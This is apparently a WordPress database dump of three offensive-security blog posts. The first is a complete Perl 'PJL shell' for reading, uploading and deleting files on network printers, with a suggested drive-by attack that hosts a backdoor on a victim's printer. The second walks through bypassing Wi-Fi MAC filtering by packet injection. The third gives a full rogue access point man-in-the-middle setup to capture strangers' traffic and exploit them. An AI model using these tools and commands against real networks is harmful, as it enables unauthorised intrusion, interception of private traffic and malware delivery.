'209','3','open','http://www.attackvector.org/?p=209','0','open','','2','This will probably be the last post regarding printers, unless I come across something completely new and interesting.  In the previous two posts, I showed how to use a printer as a zombie for network scanning.  In the next one I talked about enabling job holding and a piece of software called \'hijetter\'.\n\nWell, hijetter was really starting to irritate me.  It was constantly crashing and didn\'t work very well.. so I wrote my own.  :-)\n\nI had come across a program that was specifically designed to upload/download/append/etc. files to a printer that supported PJL.  It worked very well and seemed like a good base to build off of, since the hard part was already done.\n<!--more-->\nSo, I\'ve cleaned up the code, added a few commands, and created a \'raw\' command, which allows you to type PJL commands on the fly, which essentially turns this into a shell for printers.  Kinda.\n\nI\'m not sure if something like this already exists.. I\'m going to guess that it does.. but I haven\'t found it.  At least not something that natively runs on Linux.\n\nSo, anyway, here it is.  The uploading/downloading of files is pretty sweet.  Like I described in part 2 of this post, you could easily do a drive-by attack, uploading some kind of exploit/backdoor/something to a printer, send an email to someone at the company with a link to your hosted file, which resides on their local printer (thus circumventing firewalls/sweepers/IDS).  I have tried this and it does work.  There are certainly a million other ways to accomplish this, but with how easily ownable printers are, it\'s a pretty good target if you\'re in a hurry.\n\nYou can download this file directly from <a href=\"../files/pjl-shell.txt\">here</a>.  Be sure to rename it from .txt to .pl\n\nAlso, once again, go read <a href=\"http://h20000.www2.hp.com/bc/docs/support/SupportManual/bpl13208/bpl13208.pdf\">bpl13208.pdf</a>  It describes, in tremendous detail, all of the PJL commands, options, variables, etc.\n\n<pre lang=\"perl\" line=\"1\">\n# pjl-shell.pl\n# www.attackvector.org\n# Author of original parts unknown.\n\nuse IO::Socket;  \nuse Getopt::Long;\n\nmy $useuel=1,$listdisk=0,$target;\n$socket, $directory;\n\nmy $result=GetOptions\n   (\n      \'useuel!\'   => $useuel,  \n      \'listdisk!\' => $listdisk,\n      \'host=s\'    => $target,\n   );\n   \nif ((!defined $target) && (defined $ARGV[0])) { $target=$ARGV[0] };\n\nif(!$target) {\n   print \"Usage: $0 <ip>n\";\n   exit(0);\n}\n\nif (defined $target) {\n   $socket=opensocket($target);\n}\n\nmy $finish=0;\n\nmy %cmdhash=\n   (\n      \'open\'   => &cmd_open,\n      \'quit\'   => &cmd_quit,\n      \'bye\'    => &cmd_quit,  \n      \'drives\' => &cmd_drives,\n      \'dir\'    => &cmd_dir,\n      \'ls\'     => &cmd_dir,\n      \'cd\'     => &cmd_cd, \n      \'get\'    => &cmd_get,   \n\n      \'put\'    => &cmd_put,   \n      \'mkdir\'  => &cmd_mkdir, \n      \'del\'    => &cmd_del,   \n      \'rm\'     => &cmd_del,   \n      \'readymsg\'   => &cmd_rmsg,\n      \'config\' => &cmd_config,  \n      \'status\' => &cmd_status,  \n      \'raw\'    => &cmd_raw,     \n      \'help\'   => &cmd_help,    \n   );\n\nwhile (!$finished) {\n   print \"Current dir: $directoryn\";\n   print \"pjlftp> \";\n   my $command=<STDIN>;\n   chomp($command);\n   my @cmdlist=split(/ /,$command);\n   $cmdlist[0]=lc($cmdlist[0]);\n\n   while(my($cmd,$func) = (each %cmdhash)) {\n      if ($cmd eq $cmdlist[0]) {\n         shift(@cmdlist);\n         $finished=&$func(@cmdlist);\n      }\n       \n   }   \n}      \n       \nexit(0);\nforeach my $check (@checks) {\n   @response=sendprinter($socket, $check->{PJL});\n   if ($check->{name} eq \"Filesystem\") {\n      shift(@response);\n   }\n   foreach my $line (@response) {\n      chomp($line);\n      $line =~ s/\"//g;\n      $line =~ s/^s+//;\n      if ($check->{name} eq \"Filesystem\") {\n         my @files=split(/s+/,$line);\n\n         print \"$check->{name} $files[0]n\";\n         print \" Total Size: $files[1]n\";  \n         print \" Free Space: $files[2]n\";  \n         print \" Location: $files[3]n\";    \n         print \" Label: $files[4]n\";       \n         if ($listdisk) {\n            print \"  FILEtttTYPEttSIZEn\";\n            my @objects=displaydir($socket,1,$files[0] . \'\\\');\n         }\n      } else {\n         print \"$check->{name}: ${line}n\";\n      }\n   }   \n}      \n       \nclose($socket);\nexit(0);\n\nsub sendprinter {\n   my $socket=$_[0];\n   my $command=\'@PJL \' . $_[1];\n   my @strings;\n   my $result; \n   my $escape=pack(\"ca8\",0x1b,\'%-12345X\');\n   my $term = \"rn\";\n   my $send = $command . $term;\n   \n   if ($useuel) {\n      $send=$escape . $command . $term . $escape;\n   }\n    \n   $socket->send(\"@PJLrn\");\n   $socket->send($send);\n   \n   my $bytes;\n   my $firstnl=0;\n   if ($command =~ /PJL FSUPLOAD/) {\n      $bytes=$command;\n      $bytes =~ s/^.*SIZE=//;\n   }\n\n   while (sysread($socket, $byte, 1) == 1) {\n      if ($command =~ /PJL FSUPLOAD/) {\n         if ($firstnl == 0 && unpack(\"c\",$byte) == 0x0a) {\n            $firstnl=1;\n         }\n         $bytes-- if ($firstnl==1);\n         last if ($bytes==0);\n      } else {\n         last if (unpack(\"c\",$byte) == 0x0c);\n      }\n      $result .= $byte;\n   }\n   @strings=split(/n/, $result);\n\n   return @strings;\n}\n \nsub displaydir {\n   my $socket=$_[0];\n   my $path=$_[1];  \n   my @objects=cataloguedir($socket,$path);\n\n   if ($#objects < 0) {\n      print \"<EMPTY>n\";\n   }\n   foreach $object (@objects) {\n      my $sep=(substr($path,length($path)-1) ne \'\\\')?\'\\\':\'\';\n      print \"$object->{type}t$object->{size}t$path$sep$object->{name}n\";\n   }\n}   \n    \nsub cataloguedir {\n   my $socket=$_[0];\n   my $volume=$_[1];\n   \n   my @response;\n   my $base=\"FSDIRLIST NAME=\";\n   my @objects;\n   my $command=$base . \'\"\' . $volume . \'\"\' . \" ENTRY=1 COUNT=128\";\n\n   @response=sendprinter($socket, $command);\n   shift(@response);\n\n   shift(@response);\n   foreach my $line (@response) {\n      chomp($line);\n      my @params=split(/s+/,$line);\n      my $type=$params[1];\n      my $size=$params[2];\n      $type =~ s/^TYPE=//;\n      $size =~ s/^SIZE=//;\n      my $dirent = {\n         name => $params[0],\n         type => $type,\n         size => $size \n      };\n      push(@objects,$dirent);\n   }\n    \n   return @objects;\n}\n \nsub opensocket {\n   my $target=$_[0];\n   my $socket=new IO::Socket::INET (\n      PeerAddr => $target,\n      PeerPort => \'9100\', \n      Proto => tcp,\n   );\n\n   die \"Error: $@n\" unless $socket;\n   return $socket;\n}\n \nsub cmd_open {\n   $target=$_[0];\n   if (defined($target)) {\n      if (defined($socket)) { close($socket) };\n      $socket=opensocket($target);\n   } else {\n      print(\"No host providedn\");\n   }\n   return 0;\n}\n \nsub cmd_close {\n   if (defined($socket)) { close($socket) };\n   return 0;\n}\n \nsub cmd_quit {\n   return 1;  \n}\n \nsub cmd_drives {\n   my @response=sendprinter($socket,\"INFO FILESYS\");\n   shift(@response);\n   \n   if ($response[0] =~ \'^VOLUME\') {\n      shift(@response);\n   }\n   foreach my $line (@response) {\n      chomp($line);\n      $line =~ s/\"//g;\n      $line =~ s/^s+//;\n      # my @details=split(/s+/,$line);\n      # print(\"$details[0]n\");\n      print \"$linen\";\n   }   \n}      \n       \nsub cmd_dir {\n   if (!defined($directory)) {\n      print(\"No current directoryn\");\n      return 0;\n   }\n    \n   displaydir($socket,$directory);\n   return 0;\n}\n \nsub cmd_cd {\n   my $dir=$_[0];\n   \n   $dir=$dir . \"\\\";\n   \n   if (defined $directory) { $dir=$directory . $dir; };\n   if (defined $directory && $dir =~ /..\\$/) {\n      my $position=rindex($directory,\"\\\",length($directory)-2);\n      if ($position > 0) {\n         $directory=substr($directory, 0, $position+1);\n      }\n      return 0\n   }\n    \n   my @response=sendprinter($socket, \'FSQUERY NAME=\"\' . $dir . \'\"\');\n   shift(@response);\n   if (scalar(@response) == 0) {\n      $directory=$dir;\n   } else {\n      print(\"Directory $dir is invalidn\");\n   }\n   return 0;\n}\n \nsub cmd_get {\n   my $file=$_[0];\n   \n   open(OUTFILE,\">\",\"$file\") or die $!;\n   binmode(OUTFILE);\n   \n   my $size;\n   my $file = $directory . $file;\n   my @response=sendprinter($socket, \'FSQUERY NAME=\"\' . $file . \'\"\');\n   if (scalar(@response) != 1) {\n      print(\"File $file doesn\'t existn\");\n      return 0;\n   } else {\n      $size=$response[0];\n      $size =~ s/^.*SIZE=//;\n   }\n   my @response=sendprinter($socket, \'FSUPLOAD NAME=\"\' . $file . \'\" SIZE=\' . $size);\n   shift(@response);\n   foreach my $item (@response) {\n      print OUTFILE \"$itemn\";   \n   }\n   close(OUTFILE);\n   return 0;\n}\n \nsub cmd_get {\n   my $file=$_[0];\n   \n   \n   open(OUTFILE,\">\",\"$file\") or die $!;\n   binmode(OUTFILE);\n   \n   my $file = $directory . $file;\n   my @response=sendprinter($socket, \'FSQUERY NAME=\"\' . $file . \'\"\');\n   if (scalar(@response) != 1) {\n      print(\"File $file doesn\'t existn\");\n      return 0;\n   } else {\n      $size=$response[0];\n      $size =~ s/^.*SIZE=//;\n   }\n    \n   my @response=sendprinter($socket, \'FSUPLOAD NAME=\"\' . $file . \'\" SIZE=\' . $size);\n   shift(@response);\n   foreach my $item (@response) {\n      print OUTFILE \"$itemn\";   \n   }\n   close(OUTFILE);\n   return 0;\n}\n \nsub cmd_put {\n   my $file=$_[0];\n   \n   open(INFILE,\"<\",\"$file\") or die $!;\n   binmode(INFILE);\n   \n   my $size = -s \"$file\";\n   my $ofile = $directory . $file;\n   my $buffer;\n   \n   my $count=read(INFILE,$buffer,$size);\n   my @response=sendprinter($socket, \'FSDOWNLOAD FORMAT:BINARY SIZE=\' . $size . \' NAME=\"\' . $ofile . \'\"\' . \"rn\" . $buffer);\n   close(OUTFILE);\n   return 0;\n}   \n    \nsub cmd_mkdir {\n   my $dir=$_[0];\n   my $dir=$directory . $dir;\n   my @response=sendprinter($socket, \'FSMKDIR NAME=\"\' . $dir . \'\"\');\n   return 0;\n}\n \nsub cmd_del {\n   my $dir=$_[0];\n   my $dir=$directory . $dir;\n   my @response=sendprinter($socket, \'FSDELETE NAME=\"\' . $dir . \'\"\');\n   return 0;\n}\n \nsub cmd_rmsg {\n   my $rmsg=$_[0];\n   print \"Setting message to: $rmsg - This takes a minute, be patientn\";\n   my @response = sendprinter($socket, \'RDYMSG DISPLAY=\"\' . $rmsg . \'\"\');\n   return 0;\n}\n \nsub cmd_status {\n   my @response = sendprinter($socket, \"INFO STATUS\");\n   shift(@response);\n   foreach $line (@response) {\n      print \"$linen\";\n   }\n   return 0;\n}\n \nsub cmd_config {\n   my @response = sendprinter($socket, \"INFO CONFIG\");\n   shift(@response);\n   foreach $line (@response) {\n      print \"$linen\";\n   }\n   return 0;\n}\n \nsub cmd_raw {\n   my @response = sendprinter($socket, \"@_\");\n   shift(@response);\n   foreach $line (@response) {\n      print \"$linen\";\n   }\n   return 0;\n}\n \nsub cmd_help {\n   print \"Available commands:n\";\n   print \"topent - Open a new connectionn\";\n   print \"tquitt - Terminate sessionn\";\n   print \"tbyet - Terminate sessionn\"; \n   print \"tdrivest - List available volumesn\";\n   print \"tdirt - List files and directoriesn\";\n   print \"tlst - List files and directoriesn\"; \n   print \"tcdt - Change directoryn\";\n   print \"tgett - Download a filen\";\n   print \"tputt - Upload a filen\";  \n   print \"tmkdirt - Make a new directoryn\";\n   print \"tdelt - Delete a filen\";\n   print \"trmt - Delete a filen\"; \n   print \"treadymsgt - Change the ready messagen\";\n   print \"tconfigt - Show the hardware confign\";  \n   print \"tstatust - Show the current printer statusn\";\n   print \"trawt - Manually type commands - ie: raw INFO STATUSn\";\n   print \"thelpt - Durr..n\";\n   return 0;\n}\n</pre>\n','','2010-05-17 12:17:40','2010-05-17 17:17:40','','','2010-05-17 12:17:40','2010-05-17 17:17:40','fun-with-printers-part-3','0','','publish','Fun with printers.  [part 3]','post',''),(
'216','7','open','http://www.attackvector.org/?p=216','0','open','','2','One question that I get asked quite often is, \"how do you attack a wireless network if it uses MAC address filtering??\"\n\nThere\'s a myth that MAC address filtering is the end-all, be-all wireless security feature that will prevent even WEP networks from being owned.  This simply is not the case.\n\nThere are a few different methods for bypassing filtering.  Probably the easiest method is just simply spoofing your MAC address to match that of a client that you\'ve seen attached to the network.  This requires you to either wait, or force the client that\'s connected to disconnect, and then you replace it.  This doesn\'t always work, however.  It can be difficult to get a client to disconnect long enough for you to connect in it\'s place.  Alternatively, waiting for the client to disconnect is, well, pretty low-tech.  And, who wants to sit out in their car for 2 1/2 hours while the client you\'re trying to pwn finishes watching a movie on streaming Netflix?  Not I!\n<!--more-->\nEntire method #2.  Anyone who has played with a wireless network and cracked a WEP key has, at some point, fiddled with packet injection at some level.  There\'s a program that I use called \"WireTap\" which essentially brings packet injection to the next level.  Here\'s how I use it..\n\nI put my card in monitor mode via \'airmon-ng start wlan0\'.  I then bring up airodump and survey who\'s connected to what.  In a perfect world, I\'ll see a client connected to the AP that I want access to:\n\n<blockquote>\n BSSID                  PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                                                                                         \n 11:22:33:44:55:66    48          42           0     0    6  54 .  OPN                     linksys\n                                                                                                                                                                                        \n BSSID                    STATION              PWR   Rate    Lost  Packets  Probes                                                                                                              \n 11:22:33:44:55:66   66:55:44:33:22:11  -63    0 - 1     88       42                    \n</blockquote>\n\nOk, so there\'s a client connected.\n\nI now run WireTap, using the clients MAC address as my target..\n\n<blockquote>\n# ./wifitap.py -b 66:55:44:33:22:11 -o mon0 -i mon0\nINFO: did not find python gnuplot wrapper . Won\'t be able to plot\nINFO: Can\'t import PyX. Won\'t be able to use psdump() or pdfdump()\nIN_IFACE:   mon0\nOUT_IFACE:  mon0\nBSSID:      66:55:44:33:22:11\ntcpdump: WARNING: mon0: no IPv4 address assigned\nInterface wj0 created. Configure it and use it\n\n# ifconfig wj0 10.0.0.253\n# ifconfig eth0 down\n# ping 10.0.0.5\nPING 10.0.0.5 (10.0.0.5) 56(84) bytes of data.\n64 bytes from 10.0.0.5: icmp_seq=1 ttl=128 time=0.176 ms\n64 bytes from 10.0.0.5: icmp_seq=2 ttl=128 time=0.181 ms\n64 bytes from 10.0.0.5: icmp_seq=3 ttl=128 time=0.198 ms\n\n--- 10.0.0.5 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 1998ms\nrtt min/avg/max/mdev = 0.176/0.185/0.198/0.009 ms\n</blockquote>\n\nNow I can communicate with the other computers on the network via packet injection.  :-)','','2010-05-17 21:31:03','2010-05-18 02:31:03','','','2010-05-17 21:31:03','2010-05-18 02:31:03','bypass-mac-filtering-on-wifi-networks','0','','publish','Bypass MAC Filtering on Wifi Networks','post',''),(
'219','4','open','http://www.attackvector.org/?p=219','0','open','','2','This is going to be a rather short and sweet post because it\'s pretty heavily documented everywhere else.  The reason why I\'m posting it is because a lot of the information out there on the forums simply does not work, or is not very well explained.\n\nThe set up I have here is what I use, regularly.. so I know that it works.\n\nThere are two ways that I use this, depending on what it is that I\'m trying to accomplish.\n\nThe first way is to configure Airbase to listen for SSID probes and answer, regardless of the SSID name.  So, lets say that you have 5 wireless networks that you connect to regularly.  Your computer is constantly searching for one of those available networks and Airbase will be listening and it will pretend to be one of those networks that your computer is searching for, allowing you to connect to it.  Once you\'re connected, you can browse, just as if you were connected to your regular network.  However, this time, you\'re connecting through my computer.  Everything you do on the internet is visible to me.\n<!--more-->\nThe second way is to specify a seductive SSID name that will draw peoples attention.  Like, say, \"FREE INTERNET\".  Or something.  Obviously, people will see this and say \"cool!  A hotspot!\" and connect.  Viola, owned.  lol\n\nLets begin..\n\nFirst things first, this requires (AFAIK - Never tried using just one) two network cards.  I\'m using an integrated broadcom card, and a Netgear WG111v3.  The other requirement is a DHCP server.  Ubuntu users, \'apt-get install dhcp3-server\'\n\nEdit /etc/dhcp3/dhcpd.conf - your config should look like this:\n\n<pre>\nddns-update-style ad-hoc;\ndefault-lease-time 600;\nmax-lease-time 7200;\nsubnet 192.168.2.128 netmask 255.255.255.128 {\n  option subnet-mask 255.255.255.128;\n  option broadcast-address 192.168.2.255;\n  option routers 192.168.2.129;\n  option domain-name-servers 4.2.2.2;\n  option domain-name-servers 128.8.5.2;\n  range 192.168.2.130 192.168.2.140;\n}\n</pre>\n\nDon\'t start the server yet.. that comes later.\n\nSo, I get my broadcom card connected to a real wireless network.  This device name is \'eth1\'.  In my current configuration, it\'s IP is 192.168.0.5.\n\nNext, I use airmon-ng to start my Netgear\n\n<blockquote>\n# airmon-ng start wlan0\n..snip..\neth1		Unknown 		wl\nwlan0		RTL8187 	rtl8187 - [phy3]\n				(monitor mode enabled on mon0)\n</blockquote>\n\nOk, so now we have our monitor interface, \"mon0\"\n\nNow I start airbase..\n\n<blockquote>\n# airbase-ng -P -c 6 -v mon0\n22:56:41  Created tap interface at0\n22:56:41  Trying to set MTU on at0 to 1500\n22:56:41  Trying to set MTU on mon0 to 1800\n22:56:41  Access Point with BSSID 00:11:22:33:44:55 started.\n</blockquote>\n\nOk, now we have another interface, \"at0\"\n\nI have a simple script that I made that automates the next steps..\n\n<pre>\n#!/bin/sh\n# Bring up the tap interface\nifconfig at0 up\n# Give it an IP that matches that of whats configured in the dhcpd.conf\nifconfig at0 192.168.2.129 netmask 255.255.255.128\n# Add a route\nroute add -net 192.168.2.128 netmask 255.255.255.128 gw 192.168.2.129\n# Start (restart) the DHCP server\n/etc/init.d/dhcp3-server restart\n\n# Clear out iptables\niptables --flush\niptables --table nat --flush\niptables --delete-chain\n\n# Create a simple masquerade rule, routing all data out of eth1\niptables --table nat --append POSTROUTING --out-interface eth1 -j MASQUERADE\n# Accept anything coming in interface at0\niptables --append FORWARD --in-interface at0 -j ACCEPT\n\n# Make sure forwarding is enabled\necho 1 > /proc/sys/net/ipv4/ip_forward\n</pre>\n\nOnce you run the script, you should be ready to start accepting clients.. \n\n<blockquote>\n23:05:59  Client 00:22:33:44:55:66 associated (unencrypted) to ESSID: \"default\"\n</blockquote>\n\nGot one.  :-)\n\n<blockquote>\n# tcpdump -i at0 -A\n..snip..\n23:08:37.260533 IP l2.login.vip.re3.yahoo.com.https > 192.168.2.131.53758: Flags [.], ack 805, win 65534, options [nop,nop,TS val 2920423442 ecr 15306589], length 0\nE .4....1.u.E.p.........)...5.fZ....R......\n.. ....]\n</blockquote>\n\nOnce a client is connected, you can treat it as if it were any other computer on a LAN.. (read - open msfconsole and begin exploiting.. ;-D)\n\nAnother utility that takes advantage of this package is <a href=\"http://www.metasploit.com/redmine/projects/framework/wiki/Karmetasploit\">Karmetasploit</a>.  This will take care of the exploiting for you.  Basically, if a client connects to your fake AP, it\'ll automagically get scanned/exploited/etc.  Fun to use against war drivers/neighbors who are trying to steal your wireless.\n\nAlso, using Squid and iptables, you can have all sorts of fun using this technique, if all you\'re trying to do is pull a prank/screw with people.. check out this <a href=\"http://www.ex-parrot.com/pete/upside-down-ternet.html\">article</a>.\n\nHopefully this is clear enough for people to understand.  It\'s late, I\'m tired, and I\'m watching TV as I write it.. so.. if you find an error, please let me know so I can fix it before I embarrass myself.  Thanks.  :-)\n\n','','2010-05-17 23:23:33','2010-05-18 04:23:33','','','2010-05-17 23:23:33','2010-05-18 04:23:33','man-in-the-middle-attack-using-airbase-ng','0','','publish','Man in the Middle Attack using Airbase-ng','post','');
